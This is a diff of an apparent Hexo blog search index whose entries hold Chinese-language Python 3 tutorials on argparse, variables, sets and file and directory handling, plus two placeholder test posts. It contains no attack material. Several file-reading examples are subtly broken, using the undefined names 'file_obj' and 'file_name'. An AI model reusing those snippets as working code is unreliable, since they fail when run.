@@ -1,6 +1,26 @@
 <?xml version="1.0" encoding="utf-8"?>
 <search>
   <entry>
+    <title>2</title>
+    <url>//4ab1ce9f9fd2.html</url>
+    <content><![CDATA[<p>&lt;%- list_posts(orderby: ‘postorder’,order: 1) %</p>
+<p>测试</p>
+]]></content>
+      <tags>
+        <tag></tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>1</title>
+    <url>//f52460db58fd.html</url>
+    <content><![CDATA[<p>&lt;%- list_posts(orderby: ‘postorder’,order: 1) %</p>
+<p>测试</p>
+]]></content>
+      <tags>
+        <tag></tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Python3-argparse</title>
     <url>//1737262da5ee.html</url>
     <content><![CDATA[<h2 id="Argparse"><a href="#Argparse" class="headerlink" title="Argparse"></a>Argparse</h2><p>用于解析命令行参数和选项</p>
@@ -1124,45 +1144,6 @@
       </tags>
   </entry>
   <entry>
-    <title>Python3-常量与变量</title>
-    <url>//d9ce8a4b8ba9.html</url>
-    <content><![CDATA[<h2 id="常量与变量"><a href="#常量与变量" class="headerlink" title="常量与变量"></a>常量与变量</h2><p><strong>变量</strong>：在程序运行过程中，值会发生变化的量</p>
-<p><strong>常量</strong>：在程序运行过程中，值不会发生变化的量</p>
-<p>无论是常量还是变量，都是对象，在创建时在内存中占用一块空间，用于保存该对象的值和类型</p>
-<h2 id="变量不需要声明类型"><a href="#变量不需要声明类型" class="headerlink" title="变量不需要声明类型"></a>变量不需要声明类型</h2><p>Python的变量和常量不需要事先声明类型，根据Python的动态语言特性会自动分别类型</p>
-<p>例如<code>number</code>和<code>string</code>两个变量，在创建时不需要进行如<code>number int</code>和<code>string str</code>这样的声明，</p>
-<p>而在一些其他语言是必须的</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number = <span class="number">20</span></span><br><span class="line">string = <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="先创建在使用"><a href="#先创建在使用" class="headerlink" title="先创建在使用"></a>先创建在使用</h2><p>变量在使用前必须先赋值，变量赋值后才被创建</p>
-<p>如果没有赋值而直接使用，会抛出变量未定义的异常</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>age</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;age&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>age = <span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>age</span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="赋值的方式"><a href="#赋值的方式" class="headerlink" title="赋值的方式"></a>赋值的方式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接赋值</span></span><br><span class="line">age = <span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量赋值</span></span><br><span class="line"> a = b = c = <span class="number">1</span> </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 赋值运算记结果</span></span><br><span class="line">age = <span class="number">10</span> + <span class="number">2</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别赋值</span></span><br><span class="line">a,b,c = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
-
-
-
-<h2 id="对象存储过程"><a href="#对象存储过程" class="headerlink" title="对象存储过程"></a>对象存储过程</h2><p>当我输入<code>a = &#39;xxx&#39;</code>时</p>
-<p>在内存中创建 一个<code>&#39;xxx&#39;</code>字符串的对象</p>
-<p>在内存中创建了一个命名为a的变量，并指向Python</p>
-<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量就是不变的变量，比如圆周率就是一个常量</p>
-<p>在怕Python中，通常用全部大写的变量名表示常量</p>
-<p>事实上，常量仍然是一个变量，因为没有任何保护机制保证常量不会被修改</p>
-<p>用全部大写的方法来表示常量只是优化语义</p>
-]]></content>
-      <categories>
-        <category>Python3</category>
-        <category>Python3基础</category>
-      </categories>
-      <tags>
-        <tag>Python3</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Python3-异常</title>
     <url>//fc7cf6eade53.html</url>
     <content><![CDATA[<h2 id="异常"><a href="#异常" class="headerlink" title="异常"></a>异常</h2><p>程序运行过程当中，不可避免的会出现一些错误</p>
@@ -1277,6 +1258,45 @@
 </ul>
 </li>
 </ul>
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-常量与变量</title>
+    <url>//d9ce8a4b8ba9.html</url>
+    <content><![CDATA[<h2 id="常量与变量"><a href="#常量与变量" class="headerlink" title="常量与变量"></a>常量与变量</h2><p><strong>变量</strong>：在程序运行过程中，值会发生变化的量</p>
+<p><strong>常量</strong>：在程序运行过程中，值不会发生变化的量</p>
+<p>无论是常量还是变量，都是对象，在创建时在内存中占用一块空间，用于保存该对象的值和类型</p>
+<h2 id="变量不需要声明类型"><a href="#变量不需要声明类型" class="headerlink" title="变量不需要声明类型"></a>变量不需要声明类型</h2><p>Python的变量和常量不需要事先声明类型，根据Python的动态语言特性会自动分别类型</p>
+<p>例如<code>number</code>和<code>string</code>两个变量，在创建时不需要进行如<code>number int</code>和<code>string str</code>这样的声明，</p>
+<p>而在一些其他语言是必须的</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">number = <span class="number">20</span></span><br><span class="line">string = <span class="string">&#x27;hello&#x27;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="先创建在使用"><a href="#先创建在使用" class="headerlink" title="先创建在使用"></a>先创建在使用</h2><p>变量在使用前必须先赋值，变量赋值后才被创建</p>
+<p>如果没有赋值而直接使用，会抛出变量未定义的异常</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>age</span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">NameError: name <span class="string">&#x27;age&#x27;</span> <span class="keyword">is</span> <span class="keyword">not</span> defined</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>age = <span class="number">20</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>age</span><br><span class="line"><span class="number">20</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="赋值的方式"><a href="#赋值的方式" class="headerlink" title="赋值的方式"></a>赋值的方式</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 直接赋值</span></span><br><span class="line">age = <span class="number">20</span></span><br><span class="line"><span class="number">20</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 批量赋值</span></span><br><span class="line"> a = b = c = <span class="number">1</span> </span><br><span class="line">    </span><br><span class="line"><span class="comment"># 赋值运算记结果</span></span><br><span class="line">age = <span class="number">10</span> + <span class="number">2</span> </span><br><span class="line"></span><br><span class="line"><span class="comment"># 分别赋值</span></span><br><span class="line">a,b,c = <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="对象存储过程"><a href="#对象存储过程" class="headerlink" title="对象存储过程"></a>对象存储过程</h2><p>当我输入<code>a = &#39;xxx&#39;</code>时</p>
+<p>在内存中创建 一个<code>&#39;xxx&#39;</code>字符串的对象</p>
+<p>在内存中创建了一个命名为a的变量，并指向Python</p>
+<h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><p>常量就是不变的变量，比如圆周率就是一个常量</p>
+<p>在怕Python中，通常用全部大写的变量名表示常量</p>
+<p>事实上，常量仍然是一个变量，因为没有任何保护机制保证常量不会被修改</p>
+<p>用全部大写的方法来表示常量只是优化语义</p>
 ]]></content>
       <categories>
         <category>Python3</category>
@@ -1411,6 +1431,171 @@
 
 
 <h3 id="方法-2"><a href="#方法-2" class="headerlink" title="方法"></a>方法</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">语法：</span><br><span class="line">	对象.方法(条件)</span><br><span class="line"></span><br><span class="line"><span class="comment"># add() 向集合中添加元素</span></span><br><span class="line">对象名.add(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># update() 将一个集合中的元素添加到当前集合中</span></span><br><span class="line"><span class="comment"># update()可以传递序列或字典作为参数，字典只会使用键</span></span><br><span class="line">s2 = <span class="built_in">set</span>(<span class="string">&#x27;hello&#x27;</span>)</span><br><span class="line">对象<span class="number">1.</span>update(对象<span class="number">2</span>)</span><br><span class="line">对象名.update([元素<span class="number">1</span>，元素<span class="number">2.</span>.....])</span><br><span class="line">对象名.update(&#123;key:value,key:value.......&#125;)</span><br><span class="line"></span><br><span class="line"><span class="comment"># pop()随机删除并返回一个集合中的元素</span></span><br><span class="line">变量 = 对象名.pop()</span><br><span class="line"></span><br><span class="line"><span class="comment"># remove()删除集合中的指定元素</span></span><br><span class="line">对象名.remove(元素)</span><br><span class="line"></span><br><span class="line"><span class="comment"># clear()清空集合</span></span><br><span class="line">对象名.clear()</span><br><span class="line"></span><br><span class="line"><span class="comment"># copy()对集合进行浅复制</span></span><br><span class="line">变量 = 对象名.copy()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 在对集合做运算时，不会影响原来的集合，而是返回一个运算结果</span></span><br><span class="line"><span class="comment"># 创建两个集合</span></span><br><span class="line">s = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line">s2 = &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment"># &amp; 交集运算</span></span><br><span class="line">result = s &amp; s2 <span class="comment"># &#123;3, 4, 5&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># | 并集运算</span></span><br><span class="line">result = s | s2 <span class="comment"># &#123;1,2,3,4,5,6,7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># - 差集</span></span><br><span class="line">result = s - s2 <span class="comment"># &#123;1, 2&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># ^ 异或集 获取只在一个集合中出现的元素</span></span><br><span class="line">result = s ^ s2 <span class="comment"># &#123;1, 2, 6, 7&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt;= 检查一个集合是否是另一个集合的子集</span></span><br><span class="line"><span class="comment"># 如果a集合中的元素全部都在b集合中出现，那么a集合就是b集合的子集，b集合是a集合超集</span></span><br><span class="line">a = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125;</span><br><span class="line">b = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;</span><br><span class="line"></span><br><span class="line">result = a &lt;= b <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># True</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; &lt;= &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># &lt; 检查一个集合是否是另一个集合的真子集</span></span><br><span class="line"><span class="comment"># 如果超集b中含有子集a中所有元素，并且b中还有a中没有的元素，则b就是a的真超集，a是b的真子集</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; <span class="comment"># False</span></span><br><span class="line">result = &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>&#125; &lt; &#123;<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125; <span class="comment"># True</span></span><br><span class="line"></span><br><span class="line">difference()	返回包含两个或更多集合之间差异的集合。</span><br><span class="line">difference_update()	删除此集合中也包含在另一个指定集合中的项目。</span><br><span class="line">discard()	删除指定项目。</span><br><span class="line">intersection()	返回为两个其他集合的交集的集合。</span><br><span class="line">intersection_update()	删除此集合中不存在于其他指定集合中的项目。</span><br><span class="line">isdisjoint()	返回两个集合是否有交集。</span><br><span class="line">issubset()	返回另一个集合是否包含此集合。</span><br><span class="line">issuperset()	返回此集合是否包含另一个集合。</span><br><span class="line">symmetric_difference()	返回具有两组集合的对称差集的集合。</span><br><span class="line">symmetric_difference_update()	插入此集合和另一个集合的对称差集。</span><br><span class="line">union()	返回包含集合并集的集合。</span><br><span class="line">update()	用此集合和其他集合的并集来更新集合。</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>Python3</category>
+        <category>Python3基础</category>
+      </categories>
+      <tags>
+        <tag>Python3</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>Python3-文件与目录</title>
+    <url>//aeab54f73184.html</url>
+    <content><![CDATA[<h2 id="文件"><a href="#文件" class="headerlink" title="文件"></a>文件</h2><p>通过python程序对计算机中的各种文件进行增删改查等操作</p>
+<p>I/O (input/output)</p>
+<p>在windows系统使用路径时，可以使用<code>/</code>来代替 <code>\</code><br>或者可以使用 <code>\\ </code>来代替 <code>\</code><br>或者也可以使用原始字符串<code> r&#39;xxx&#39;</code><br>表示路径，可以使用<code>..</code>来返回一级目录</p>
+<h2 id="打开文件"><a href="#打开文件" class="headerlink" title="打开文件"></a>打开文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="built_in">open</span>(file, mode=<span class="string">&#x27;r&#x27;</span>, buffering=-<span class="number">1</span>, encoding_=<span class="literal">None</span>, errors=<span class="literal">None</span>, newline=<span class="literal">None</span>, closefd=<span class="literal">True</span>, opener=<span class="literal">None</span>)</span><br><span class="line">参数：</span><br><span class="line">	<span class="built_in">open</span>(file) 要打开的文件的名字（路径）</span><br><span class="line">返回值：</span><br><span class="line">	返回一个对象，这个对象就代表了当前打开的文件</span><br><span class="line">    </span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line"><span class="built_in">print</span>(file)</span><br><span class="line"></span><br><span class="line"><span class="comment"># with...as 语句</span></span><br><span class="line"><span class="comment"># 通过with语句，在处理文件时，不论是否抛出异常，都可以保证关闭已经打开的文件</span></span><br><span class="line"><span class="comment"># as后跟自定义变量</span></span><br><span class="line"><span class="comment"># 在with语句中可以直接使用file_obj来做文件操作</span></span><br><span class="line"><span class="comment"># 这个文件只能在with中使用，一旦with结束则文件会自动close()</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a) <span class="keyword">as</span> file:</span><br><span class="line">    <span class="built_in">print</span>(file.read())</span><br><span class="line">    </span><br><span class="line"><span class="comment"># 调用open()来打开一个文件，可以将文件分成两种类型</span></span><br><span class="line"><span class="comment"># 一种，是纯文本文件（使用utf-8等编码编写的文本文件）</span></span><br><span class="line"><span class="comment"># 一种，是二进制文件（图片、mp3、ppt等这些文件）</span></span><br><span class="line"><span class="comment"># open()打开文件时，默认是以文本文件的形式打开的，但是open()默认的编码为None</span></span><br><span class="line"><span class="comment"># encodint可以设置指定文件的编码</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="built_in">print</span>(file.read())</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="关闭文件"><a href="#关闭文件" class="headerlink" title="关闭文件"></a>关闭文件</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 关闭文件</span></span><br><span class="line">file.close()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件读取"><a href="#文件读取" class="headerlink" title="文件读取"></a>文件读取</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line">file = <span class="built_in">open</span>(a)</span><br><span class="line">b = file.read()</span><br><span class="line"><span class="built_in">print</span>(b)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件</span></span><br><span class="line"><span class="comment"># 如果要读取的文件较大的话，会一次性将文件的内容加载到内存中，容易导致内存泄漏</span></span><br><span class="line"><span class="comment"># 所以不能直接调用read()</span></span><br><span class="line"><span class="comment"># read()可以接收一个size作为参数，该参数用来指定要读取的字符的数量</span></span><br><span class="line"><span class="comment">#   默认值为-1，它会读取文件中的所有字符</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		content = file_obj.read(-<span class="number">1</span>)</span><br><span class="line">		content = file_obj.read(<span class="number">20</span>)</span><br><span class="line">		<span class="built_in">print</span>(content)</span><br><span class="line">		<span class="built_in">print</span>(<span class="built_in">len</span>(content))</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 读取大文件方法二</span></span><br><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">	<span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">		<span class="comment"># 定义一个变量，来保存文件的内容</span></span><br><span class="line">        file_content = <span class="string">&#x27;&#x27;</span></span><br><span class="line">		<span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">			content = file_obj.read(<span class="number">100</span>)</span><br><span class="line">			<span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">				<span class="keyword">break</span></span><br><span class="line">			<span class="comment"># print(content,end=&#x27;&#x27;)</span></span><br><span class="line">			<span class="comment"># 利用拼串的方式分块读取内容</span></span><br><span class="line">			file_content += content</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError :</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 这个文件不存在！&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(file_content)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="readline"><a href="#readline" class="headerlink" title="readline()"></a>readline()</h2><p>readline() 该方法可以用来读取一行内容<br>readlines()    该方法用于一行一行读取内容，会一次性把读取到的内容封装到列表中</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">a = <span class="string">r&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">import</span> pprint <span class="comment"># 当字符超过80字节时，用来美化输出</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(a,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="built_in">print</span>(file.readline(),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">	<span class="comment"># r = file.readlines()</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r)</span></span><br><span class="line">    <span class="comment"># pprint.pprint(r[1])</span></span><br><span class="line"><span class="comment"># for循环也可以一行行读取数据</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> file:</span><br><span class="line">	<span class="built_in">print</span>(i)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="tell"><a href="#tell" class="headerlink" title="tell()"></a>tell()</h2><p><code>tell()</code>方法用来查看当前读取位置</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="seek"><a href="#seek" class="headerlink" title="seek()"></a>seek()</h2><p><code>seek()</code>用来修改当前读取的位</p>
+<p><code>seek()</code>需要两个参数，第一个是要切换到的位置，第二个是计算位置方式</p>
+<p>可选值：</p>
+<ul>
+<li>0： 从头计算，默认值</li>
+<li>1：从当前位置计算</li>
+<li>2：从最后位置开始计算</li>
+</ul>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;123.txt&quot;</span>,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line"><span class="comment"># 使用seek(x,2)的时候，用r+可能导致报错，推荐使用rb</span></span><br><span class="line"><span class="comment"># rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.read(<span class="number">130</span>))</span><br><span class="line">    <span class="comment"># 读取前130个字节</span></span><br><span class="line">    <span class="built_in">print</span>(file_obj.tell())</span><br><span class="line">    <span class="comment"># 返回当前读取的位置，返回的是字节位置，不是行数</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>)</span><br><span class="line">    <span class="comment"># 修改当前读取的位置为50字节</span></span><br><span class="line">    file_obj.seek(<span class="number">50</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="comment"># 从50个字节起读取50个字节</span></span><br><span class="line">    file_obj.seek(<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个之后的,会什么都读取不到</span></span><br><span class="line">    file_obj.seek(-<span class="number">1</span>,<span class="number">2</span>)</span><br><span class="line">    <span class="comment"># 读取最后一个字节</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;当前读取的位置是:&#x27;</span>,file_obj.tell())</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="文件写入"><a href="#文件写入" class="headerlink" title="文件写入"></a>文件写入</h2><table>
+<thead>
+<tr>
+<th align="center">参数</th>
+<th align="center">描述</th>
+</tr>
+</thead>
+<tbody><tr>
+<td align="center">t</td>
+<td align="center">文本模式（默认）</td>
+</tr>
+<tr>
+<td align="center">x</td>
+<td align="center">写模式，新建文件，如果该文件存在则报错</td>
+</tr>
+<tr>
+<td align="center">b</td>
+<td align="center">二进制模式</td>
+</tr>
+<tr>
+<td align="center">+</td>
+<td align="center">打开一个文件（可读可写）</td>
+</tr>
+<tr>
+<td align="center">U</td>
+<td align="center">通用换行模式（不推荐）</td>
+</tr>
+<tr>
+<td align="center">r</td>
+<td align="center">以只读方式打开文件（默认），文件不存在则报错</td>
+</tr>
+<tr>
+<td align="center">rb</td>
+<td align="center">以只读方式打开二进制文件（默认）</td>
+</tr>
+<tr>
+<td align="center">r+</td>
+<td align="center">以读写的方式打开一个文件</td>
+</tr>
+<tr>
+<td align="center">rb+</td>
+<td align="center">以读写的方式打开一个二进制文件</td>
+</tr>
+<tr>
+<td align="center">w</td>
+<td align="center">以只写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">wb</td>
+<td align="center">以只写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">w+</td>
+<td align="center">以读写的方式打开一个文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">wb+</td>
+<td align="center">以读写的方式打开一个二进制文件，如果文件存在则覆盖，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">a</td>
+<td align="center">以追加的方式写入一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">ab</td>
+<td align="center">以追加的方式写入一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">a+</td>
+<td align="center">以追加的方式读写一个文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+<tr>
+<td align="center">ab+</td>
+<td align="center">以追加的方式读写一个二进制文件，如果文件存在则在末尾追加，文件不存在则新建文件</td>
+</tr>
+</tbody></table>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 文件写入</span></span><br><span class="line"><span class="comment"># 如果不指定操作类型，则默认是 读取文件 ， 而读取文件时是不能向文件中写入的</span></span><br><span class="line">name = <span class="string">&#x27;xxx&#x27;</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(name,<span class="string">&#x27;a&#x27;</span>,encoding=<span class="string">&#x27;utf-8&#x27;</span>) <span class="keyword">as</span> file:</span><br><span class="line">	<span class="comment"># write()来向文件中写入内容，不会自动换行</span></span><br><span class="line">    <span class="comment"># 如果操作的是一个文本文件的话，则write()需要传递一个字符串作为参数</span></span><br><span class="line">    <span class="comment"># 该方法会可以分多次向文件中写入内容</span></span><br><span class="line">    <span class="comment"># 写入完成以后，该方法会返回写入的字符的个数</span></span><br><span class="line">	file.write(<span class="string">&#x27;hello\n&#x27;</span>)</span><br><span class="line">	r = file.write(<span class="built_in">str</span>(<span class="number">123</span>))</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="二进制文件"><a href="#二进制文件" class="headerlink" title="二进制文件"></a>二进制文件</h2><p>二进制文件<br>所有文件分为文本文件和二进制文件<br>读取模式<br>t 读取文本文件（默认值）<br>b 读取二进制文件<br>读取文本文件时，size是以字符为单位的<br>读取二进制文件时，size是以字节为单位</p>
+<p>rb是读取二进制文件，所以read读取一百个字节，字母是一个字节，汉字是三个</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&quot;xxx/xxx.jpg&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(file_name,<span class="string">&quot;rb&quot;</span>) <span class="keyword">as</span> file_obj:</span><br><span class="line">    new_name = <span class="string">&quot;new.jpg&quot;</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(new_name,<span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> new_obj:</span><br><span class="line">        chunk = <span class="number">1024</span> * <span class="number">100</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            content = file_obj.read(chunk)</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> content:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            new_obj.write(content)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="检查文件是否存在"><a href="#检查文件是否存在" class="headerlink" title="检查文件是否存在"></a>检查文件是否存在</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">file_name = <span class="string">&#x27;hello&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(file_name) <span class="keyword">as</span> file_obj :</span><br><span class="line">        <span class="built_in">print</span>(file_obj.read())</span><br><span class="line"><span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&#x27;<span class="subst">&#123;file_name&#125;</span> 文件不存在~~&#x27;</span>)</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="OS模块"><a href="#OS模块" class="headerlink" title="OS模块"></a>OS模块</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> pprint</span><br><span class="line"></span><br><span class="line">path = os.listdir()</span><br><span class="line"><span class="comment"># os.listdir()获取指定目录的结构，默认获取当前路径，返回一个列表</span></span><br><span class="line">path1 = os.getcwd()</span><br><span class="line"><span class="comment"># os.getcwd()获取当前所在的路径</span></span><br><span class="line">os.chdir(<span class="string">&quot;c:\\xxx\\xxx&quot;</span>)</span><br><span class="line"><span class="comment"># os.chdir(&quot;c:\\&quot;&quot;)修改当前路径为xxx</span></span><br><span class="line">pprint.pprint(path1)</span><br><span class="line"></span><br><span class="line">os.mkdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下创建一个目录</span></span><br><span class="line">os.rmdir(<span class="string">&quot;xxx&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除一个目录</span></span><br><span class="line">os.remove(<span class="string">&quot;xxx.txt&quot;</span>)</span><br><span class="line"><span class="comment"># 在当前路径下删除文件</span></span><br><span class="line">os.rename(<span class="string">&quot;旧名字&quot;</span>,<span class="string">&quot;新名字&quot;</span>)</span><br><span class="line"><span class="comment"># 